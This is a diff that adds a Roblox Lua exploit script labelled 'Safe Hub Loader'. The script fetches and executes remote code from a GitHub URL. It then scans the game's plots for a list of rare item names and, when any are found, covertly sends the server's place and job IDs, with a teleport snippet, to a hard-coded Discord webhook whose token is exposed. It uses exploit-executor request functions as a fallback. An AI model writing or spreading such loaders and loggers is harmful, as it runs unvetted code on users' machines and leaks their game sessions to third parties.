@@ -1,0 +1,128 @@
+-- ==========================
+-- Safe Hub Loader
+-- ==========================
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/alexscriptsgg/Kurdhubv5/refs/heads/main/Go717"))()
+end)
+
+-- services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+-- Discord webhook
+local webhookURL = "https://discord.com/api/webhooks/1406582863792701611/lzahoa_Gi1zlBV3yOmY1MlYVib2OgiRP_Gf2qjObdXVnd_JwUtL_bbwnwggxXTWcvmXo"
+
+-- list of names to check (case-insensitive)
+local targetNames = {
+    "chimpanzini bananini",
+    "frigo camelo",
+    "tung tung tung sahur",
+    "las vaquitas saturnitas",
+    "chicleteira bicicleteira",
+    "tortuginni dragonfruitini",
+    "garama and madundung",
+    "nuclearo dinossauro",
+    "la grande combinasion",
+    "graipuss medussi",
+    "los tralaleritos",
+    "chimpanzini spiderini",
+    "la vacca staturno saturnita",
+    "piccione macchina",
+    "los crocodillitos",
+    "orcalero orcala",
+    "trigoligre frutonni",
+    "odin din din dun",
+    "tralalero tralala" -- NEW TARGET ADDED
+}
+
+-- function to capitalize words properly
+local function capitalizeWords(str)
+    return str:gsub("(%a)([%w_']*)", function(first, rest)
+        return first:upper() .. rest:lower()
+    end)
+end
+
+-- function to find targets in workspace.Plots
+local function findTargets()
+    local found = {}
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return found end
+
+    for _, inst in pairs(plots:GetDescendants()) do
+        if type(inst.Name) == "string" then
+            local lowerName = inst.Name:lower()
+            for _, target in pairs(targetNames) do
+                if lowerName == target:lower() then
+                    if not table.find(found, target) then
+                        table.insert(found, target)
+                    end
+                end
+            end
+        end
+
+        -- Check StringValue too
+        if inst:IsA("StringValue") and inst.Value then
+            local lowerValue = inst.Value:lower()
+            for _, target in pairs(targetNames) do
+                if lowerValue == target:lower() then
+                    if not table.find(found, target) then
+                        table.insert(found, target)
+                    end
+                end
+            end
+        end
+    end
+    return found
+end
+
+-- reliable webhook send function
+local function sendWebhook(embedData)
+    local payload = HttpService:JSONEncode({embeds = {embedData}})
+    local success, err = pcall(function()
+        HttpService:PostAsync(webhookURL, payload, Enum.HttpContentType.ApplicationJson)
+    end)
+    if not success then
+        -- fallback for exploit environments
+        pcall(function()
+            if syn and syn.request then
+                syn.request({Url=webhookURL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload})
+            elseif request then
+                request({Url=webhookURL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload})
+            elseif http and http.request then
+                http.request({Url=webhookURL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload})
+            end
+        end)
+    end
+end
+
+-- main logic
+local foundTargets = findTargets()
+if #foundTargets > 0 then
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local playerCount = #Players:GetPlayers() -- current number of players in server
+
+    for _, name in ipairs(foundTargets) do
+        local formattedName = capitalizeWords(name)
+
+        -- teleport snippet wrapped in triple backticks
+        local teleportSnippet = string.format("```lua\nlocal player = game.Players:GetPlayers()[1]\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(\"%d\", \"%s\", player)\n```", placeId, jobId)
+
+        -- Discord embed with emojis
+        local embed = {
+            title = "🎯 Target Found!",
+            description = string.format("**%s** found! ✅\nCurrent players in server: %d\n%s", formattedName, playerCount, teleportSnippet),
+            color = 0x1ABC9C, -- teal color
+            footer = {
+                text = "Roblox Hub Logger",
+                icon_url = "https://www.roblox.com/favicon.ico"
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+
+        sendWebhook(embed)
+        print("[Logger] "..formattedName.." found! Teleport script sent as embed.")
+    end
+else
+    print("[Logger] No target names found in Plots. No webhook sent.")
+end
